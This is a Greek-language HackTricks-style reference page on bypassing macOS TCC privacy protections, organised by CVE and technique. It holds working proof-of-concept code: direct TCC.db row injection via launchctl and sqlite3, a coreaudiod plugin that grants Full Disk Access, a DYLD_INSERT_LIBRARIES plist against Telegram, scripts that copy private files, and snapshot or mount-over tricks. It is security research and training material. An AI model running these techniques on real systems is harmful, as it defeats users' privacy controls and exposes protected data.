# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Ανά λειτουργικότητα

### Write Bypass

Αυτό δεν είναι bypass, αλλά απλώς ο τρόπος με τον οποίο λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν το Terminal **δεν έχει πρόσβαση για ανάγνωση στην επιφάνεια εργασίας ενός χρήστη, μπορεί και πάλι να γράψει σε αυτήν**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **extended attribute `com.apple.macl`** προστίθεται στο νέο **file** για να δώσει στην **creators app** πρόσβαση ανάγνωσης.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Είναι δυνατό να **τοποθετηθεί ένα παράθυρο πάνω από το TCC prompt**, ώστε ο χρήστης να το **αποδεχτεί** χωρίς να το αντιληφθεί. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ο attacker μπορεί να **δημιουργήσει apps με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να τα κάνει να ζητούν πρόσβαση σε κάποια τοποθεσία που προστατεύεται από το TCC. Ο χρήστης θα πιστεύει ότι η νόμιμη εφαρμογή είναι αυτή που ζητά την πρόσβαση.\
Επιπλέον, είναι δυνατό να **αφαιρεθεί η νόμιμη app από το Dock και να τοποθετηθεί εκεί η fake app**, ώστε όταν ο χρήστης κάνει click στη fake app (η οποία μπορεί να χρησιμοποιεί το ίδιο icon), αυτή να μπορεί να καλέσει τη νόμιμη app, να ζητήσει TCC permissions και να εκτελέσει ένα malware, κάνοντας τον χρήστη να πιστέψει ότι η νόμιμη app ζήτησε την πρόσβαση.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC στο:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Full Disk Access"**. Για να το απενεργοποιήσετε, πρέπει να είναι καταχωρισμένο αλλά απενεργοποιημένο (η αφαίρεσή του από τη λίστα δεν θα αφαιρέσει αυτά τα privileges):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Από προεπιλογή, η πρόσβαση μέσω SSH είχε "Full Disk Access". Για να το απενεργοποιήσετε, πρέπει να είναι καταχωρισμένο αλλά απενεργοποιημένο (η αφαίρεσή του...](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα για το πώς ορισμένα **malwares κατάφεραν να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Σημειώστε ότι πλέον, για να μπορέσετε να ενεργοποιήσετε το SSH, χρειάζεστε **Full Disk Access**

### Handle extensions - CVE-2022-26767

Το attribute **`com.apple.macl`** παρέχεται σε files για να δώσει σε **μια συγκεκριμένη εφαρμογή permissions ανάγνωσης του file.** Αυτό το attribute ορίζεται όταν γίνεται **drag\&drop** ενός file πάνω σε μια app ή όταν ένας χρήστης κάνει **double-click** σε ένα file για να το ανοίξει με την **default application**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει μια malicious app** για να χειρίζεται όλα τα extensions και να καλέσει το Launch Services για να **ανοίξει** οποιοδήποτε file (οπότε στη malicious app θα παραχωρηθεί πρόσβαση ανάγνωσής του).<sup>[[23]](#references)</sup>

### iCloud

Με το entitlement **`com.apple.private.icloud-account-access`** είναι δυνατό να γίνει επικοινωνία με το **`com.apple.iCloudHelper`** XPC service, το οποίο θα **παρέχει iCloud tokens**.

Οι **iMovie** και **Garageband** είχαν αυτό το entitlement, καθώς και άλλα που το επέτρεπαν.

Για περισσότερες **πληροφορίες** σχετικά με το exploit για την **απόκτηση icloud tokens** μέσω αυτού του entitlement, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Μια app με permission **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλες Apps**. Αυτό σημαίνει ότι θα μπορούσε να **καταχραστεί τα permissions που έχουν παραχωρηθεί στις άλλες Apps**.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, δείτε:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν μια App έχει **Automation permission πάνω στο `iTerm`**, όπως σε αυτό το παράδειγμα όπου το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Το Terminal, που δεν έχει FDA, μπορεί να καλέσει το iTerm, το οποίο το έχει, και να το χρησιμοποιήσει για την εκτέλεση ενεργειών:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Μέσω του Finder

Ή, αν μια εφαρμογή έχει πρόσβαση μέσω του Finder, θα μπορούσε να εκτελέσει ένα script όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ανά συμπεριφορά εφαρμογής

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το **tccd daemon** στο **userland** χρησιμοποιούσε τη μεταβλητή **`HOME`** **env** για πρόσβαση στη βάση δεδομένων χρηστών του TCC από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το TCC daemon εκτελείται μέσω του **`launchd`** εντός του domain του τρέχοντος χρήστη, είναι δυνατό να **ελεγχθούν όλες οι μεταβλητές περιβάλλοντος** που του μεταβιβάζονται.<sup>[[19]](#references)</sup>\
Έτσι, ένας **attacker θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`**, ώστε να δείχνει σε έναν **ελεγχόμενο** **directory**, να κάνει **restart** το **TCC** daemon και, στη συνέχεια, να **τροποποιήσει απευθείας τη βάση δεδομένων TCC**, παρέχοντας στον ίδιο **κάθε διαθέσιμο TCC entitlement** χωρίς να εμφανιστεί ποτέ prompt στον end user.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Το Notes είχε πρόσβαση σε τοποθεσίες που προστατεύονταν από το TCC, αλλά μια νέα σημείωση που δημιουργούνταν **αποθηκευόταν σε μη προστατευμένη τοποθεσία**. Επομένως, ένας attacker μπορούσε να ζητήσει από το Notes να αντιγράψει ένα προστατευμένο αρχείο σε μια σημείωση και στη συνέχεια να αποκτήσει πρόσβαση στα δεδομένα που προέκυπταν από τη μη προστατευμένη τοποθεσία:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Το binary `/usr/libexec/lsd` με τη library `libsecurity_translocate` είχε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργεί **nullfs** mount, και είχε το entitlement `com.apple.private.tcc.allow` με **`kTCCServiceSystemPolicyAllFiles`** για πρόσβαση σε κάθε αρχείο.

Ήταν δυνατή η προσθήκη του quarantine attribute στο "Library", η κλήση του **`com.apple.security.translocation`** XPC service και, στη συνέχεια, το Library αντιστοιχιζόταν στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου μπορούσαν να **προσπελαστούν** όλα τα έγγραφα μέσα στο Library.

### CVE-2024-44131 - FileProvider symlink race

Οι εφαρμογές που αναθέτουν τις λειτουργίες αρχείων σε έναν **privileged helper** (εδώ το **`fileproviderd`** / **`Files.app`**) αντιγράφουν ή μετακινούν items **on behalf of the user**, επομένως η αντιγραφή εκτελείται με τα privileges του helper αντί για εκείνα του caller.

Το Jamf Threat Labs έδειξε ότι το symlink validation που εκτελείται πριν από τη λειτουργία μπορεί να γίνει **race**: αντί να τοποθετήσει το symlink στο **τελευταίο** path component (το οποίο ελέγχεται), ο attacker αντικαθιστά έναν **ενδιάμεσο** directory του path **αφού έχει ήδη ξεκινήσει η αντιγραφή**. Στη συνέχεια, ο privileged helper ακολουθεί το link που ελέγχει ο attacker και διαβάζει/γράφει σε τοποθεσίες που προστατεύονται από το TCC **χωρίς να εμφανίσει ποτέ prompt**.<sup>[[5]](#references)</sup>

Οι directories που **δεν** προστατεύονται από ένα random UUID στο path τους (για παράδειγμα `~/Library/Mobile Documents/com~apple~CloudDocs`) είναι οι ευκολότεροι στόχοι, επειδή ο attacker μπορεί να προβλέψει το πλήρες path για το race.

> [!TIP]
> Αυτό είναι το generic pattern που πρέπει να αναζητάτε: **κάθε privileged process που επιλύει ένα path περισσότερες από μία φορές** (check-then-use ή `rename()`/`copyfile()` που επιλύουν ξεχωριστά το source και το destination) μπορεί να γίνει race με την αντικατάσταση ενός directory στη μέση του path. Μόνο τα `O_NOFOLLOW_ANY`, `openat()` σε ένα ήδη ανοιχτό directory FD ή το `realpath()` + re-validation κλείνουν πραγματικά το παράθυρο.

Περισσότερες πληροφορίες στο [**writeup του Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

Η `libsqlite3` μπορεί να γίνει build με `SQLITE_ENABLE_SQLLOG`, το οποίο προσθέτει ένα logging hook που ελέγχεται από environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – για **κάθε database που ανοίγεται**, ένα **copy του database file** και ένα log των SQL statements γράφονται στο `path` (το directory πρέπει να υπάρχει ήδη).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – λαμβάνεται ένα **fresh copy κάθε φορά** που γίνεται open/attach μιας DB αντί να επαναχρησιμοποιείται ένα υπάρχον.
- **`SQLITE_SQLLOG_CONDITIONAL`** – καταγράφεται μια connection μόνο αν υπάρχει ένα αρχείο `<database>-sqllog` δίπλα στην κύρια DB.

Αν μπορείτε να κάνετε inject αυτή τη variable σε ένα process που έχει **FDA** και ανοίγει SQLite databases, θα **αντιγράψει πρόθυμα αυτές τις προστατευμένες databases** σε ένα directory που ελέγχετε. Επειδή το destination filename προκύπτει από δεδομένα που ελέγχει ο attacker, ένα **symlink που έχει τοποθετηθεί στο destination** μετατρέπει το ίδιο primitive σε **arbitrary file write** με τα privileges του target process.

### **SQLITE_AUTO_TRACE**

Αν οριστεί η environment variable **`SQLITE_AUTO_TRACE`**, η library **`libsqlite3.dylib`** θα αρχίσει να **καταγράφει** όλα τα SQL queries. Πολλές εφαρμογές χρησιμοποιούσαν αυτή τη library, επομένως ήταν δυνατή η καταγραφή όλων των SQLite queries τους.<sup>[[22]](#references)</sup>

Αρκετές εφαρμογές της Apple χρησιμοποιούσαν αυτή τη library για πρόσβαση σε πληροφορίες που προστατεύονται από το TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Αναζήτηση για εγγραφές αρχείων που καθοδηγούνται από env-var

Οι δύο προηγούμενες καταχωρίσεις είναι παραδείγματα της ίδιας γενικής τεχνικής και αξίζει να αναζητήσετε περισσότερα: **τα frameworks που φορτώνονται σε TCC-privileged apps συχνά εκθέτουν environment variables για debugging/logging, τα οποία κάνουν τη διεργασία να δημιουργεί ένα αρχείο σε path που ελέγχεται από τον caller**.

Workflow για να τα εντοπίσετε:

1. Επιλέξτε έναν στόχο με FDA ή άλλη ενδιαφέρουσα TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) και καταγράψτε τα frameworks με τα οποία συνδέεται (`otool -L`, `vmmap`).
2. Κάντε grep σε αυτά τα frameworks για strings του `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ορίστε τις υποψήφιες μεταβλητές μέσω `launchctl setenv NAME /path/you/control`, εκκινήστε την εφαρμογή και παρακολουθήστε τι κάνει στο filesystem με `fs_usage -w -f filesys <pid>` ή `sudo fs_usage | grep <path>`.
4. Αν η διεργασία **δημιουργεί ή μετονομάζει** ένα αρχείο στον κατάλογό σας, έχετε ένα write primitive: δείξτε τον προορισμό σε ένα symlink (ή κάντε race σε έναν ενδιάμεσο κατάλογο, όπως στο CVE-2024-44131 παραπάνω) για να το ανακατευθύνετε στο `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Δύο πράγματα περιορίζουν αυτή την τεχνική. Πρώτον, οι μεταβλητές `DYLD_*` αγνοούνται για hardened-runtime binaries, εκτός αν η εφαρμογή περιλαμβάνει το entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — δείτε επίσης το [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Δεύτερον, η Apple αφαιρεί μεμονωμένες debug variables των frameworks μόλις αναφερθούν, επομένως μια μεταβλητή που λειτουργούσε σε μία έκδοση του macOS συχνά έχει αφαιρεθεί στην επόμενη. Αν μια εφαρμογή αρνείται σιωπηλά να εκκινήσει αφού ορίσετε κάποια, θεωρήστε ότι η μεταβλητή έχει ήδη φιλτραριστεί.<sup>[[7]](#references)[[8]](#references)</sup>

Δείτε το [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) για το αντίστοιχο trick με linker variables.

### Apple Remote Desktop

Ως root θα μπορούσατε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα είχε full disk access**, το οποίο θα μπορούσε στη συνέχεια να χρησιμοποιηθεί από έναν χρήστη ώστε να αντιγράψει μια νέα **TCC user database**.

## Μέσω του **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια database στον HOME φάκελο του χρήστη για να ελέγχει την πρόσβαση σε resources που αφορούν συγκεκριμένα τον χρήστη, στη διαδρομή **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να κάνει restart το TCC με μια μεταβλητή `$HOME` που δείχνει σε έναν **διαφορετικό φάκελο**, θα μπορούσε να δημιουργήσει μια νέα TCC database στο **/Library/Application Support/com.apple.TCC/TCC.db** και να παραπλανήσει το TCC ώστε να εκχωρήσει οποιαδήποτε TCC permission σε οποιαδήποτε εφαρμογή.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που είναι αποθηκευμένη στο profile του χρήστη, μέσα στο attribute **`NFSHomeDirectory`**, για την **τιμή του `$HOME`**. Επομένως, αν παραβιάσετε μια εφαρμογή με permissions τροποποίησης αυτής της τιμής (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **weaponize** αυτή την επιλογή με ένα TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **πρώτο POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει τον φάκελο **HOME** του χρήστη.

1. Λάβετε ένα _csreq_ blob για την εφαρμογή-στόχο.
2. Τοποθετήστε ένα fake _TCC.db_ file με την απαιτούμενη πρόσβαση και το _csreq_ blob.
3. Κάντε export την καταχώριση του χρήστη στο Directory Services με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την καταχώριση του Directory Services ώστε να αλλάξετε το home directory του χρήστη.
5. Κάντε import την τροποποιημένη καταχώριση του Directory Services με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του χρήστη και κάντε reboot τη διεργασία.

Το δεύτερο POC χρησιμοποιούσε το **`/usr/libexec/configd`**, το οποίο είχε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατή η εκτέλεση του **`configd`** με την επιλογή **`-t`**, μέσω της οποίας ένας attacker μπορούσε να καθορίσει ένα **custom Bundle προς φόρτωση**. Επομένως, το exploit **αντικαθιστά** τη μέθοδο αλλαγής του home directory του χρήστη μέσω **`dsexport`** και **`dsimport`** με **code injection στο `configd`**.

Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Μέσω process injection

Υπάρχουν διαφορετικές τεχνικές για injection κώδικα μέσα σε μια διεργασία και abuse των TCC permissions της:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, το πιο συνηθισμένο process injection για TCC bypass που έχει εντοπιστεί γίνεται μέσω **plugins (load library)**.\
Τα plugins είναι επιπλέον κώδικας, συνήθως με τη μορφή libraries ή plist, τα οποία **φορτώνονται από την κύρια εφαρμογή** και εκτελούνται μέσα στο context της. Επομένως, αν η κύρια εφαρμογή είχε πρόσβαση σε αρχεία περιορισμένα από το TCC (μέσω granted permissions ή entitlements), **ο custom κώδικας θα είχε επίσης πρόσβαση**.

### CVE-2020-27937 - Directory Utility

Η εφαρμογή `/System/Library/CoreServices/Applications/Directory Utility.app` είχε το entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωνε plugins με extension **`.daplug`** και **δεν είχε hardened** runtime.

Για να γίνει weaponize αυτό το CVE, το **`NFSHomeDirectory`** **αλλάζει** (με abuse του προηγούμενου entitlement), ώστε να είναι δυνατή η **ανάληψη της TCC database των χρηστών** και η παράκαμψη του TCC.

Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Το binary **`/usr/sbin/coreaudiod`** είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο **επέτρεπε code injection** και το δεύτερο του παρείχε πρόσβαση στη **διαχείριση του TCC**.

Αυτό το binary επέτρεπε τη φόρτωση **third-party plug-ins** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατή η **φόρτωση ενός plugin και η κατάχρηση των TCC permissions** με αυτό το PoC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, δείτε την [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Οι εφαρμογές συστήματος που ανοίγουν ροή κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν **αυτά τα plugins στη διεργασία** από το `/Library/CoreMediaIO/Plug-Ins/DAL` (δεν περιορίζεται από το SIP).

Η απλή αποθήκευση μιας βιβλιοθήκης με τον συνηθισμένο **constructor** εκεί θα λειτουργήσει για **code injection**.

Αρκετές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς μπορείτε να το εκμεταλλευτείτε εύκολα, [**δείτε το original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Το binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την εισαγωγή κώδικα μέσα στη διεργασία και τη χρήση των TCC privileges.

### CVE-2023-26818 - Telegram

Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, επομένως ήταν δυνατή η κατάχρησή του για **πρόσβαση στα permissions του**, όπως η καταγραφή μέσω της camera. Μπορείτε να [**βρείτε το payload στο writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Σημειώστε ότι, για τη χρήση του env variable ώστε να φορτωθεί μια library, δημιουργήθηκε ένα **custom plist** για την εισαγωγή αυτής της library και χρησιμοποιήθηκε το **`launchctl`** για την εκκίνησή της:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Μέσω invocations του open

Είναι δυνατό να γίνει invocation του **`open`** ακόμη και όταν εκτελείται κώδικας σε sandbox

### Terminal Scripts

Είναι αρκετά συνηθισμένο να παρέχεται **Full Disk Access (FDA)** σε ένα terminal, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από άτομα του τεχνικού χώρου. Επίσης, είναι δυνατό να γίνει invocation scripts **`.terminal`** μέσω αυτού.

Τα scripts **`.terminal`** είναι αρχεία plist όπως το παρακάτω, με την εντολή προς εκτέλεση στο key **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή θα μπορούσε να γράψει ένα terminal script σε μια τοποθεσία όπως το `/tmp` και να το εκκινήσει με μια εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με προσάρτηση

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε χρήστης** (ακόμη και μη προνομιούχοι χρήστες) μπορεί να δημιουργήσει και να προσαρτήσει ένα snapshot του Time Machine και να **αποκτήσει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του snapshot.\
Το **μόνο privilege** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει πρόσβαση **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles), την οποία πρέπει να παραχωρήσει ένας admin.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερή εξήγηση μπορεί να [**βρεθεί στο original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Ακόμη και αν το TCC DB file ήταν προστατευμένο, ήταν δυνατό να γίνει **mount πάνω από τον κατάλογο** ενός νέου TCC.db file:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Ελέγξτε το **πλήρες exploit** στο [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Όπως εξηγείται στο [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), αυτό το CVE εκμεταλλευόταν το `diskarbitrationd`.<sup>[[16]](#references)</sup>

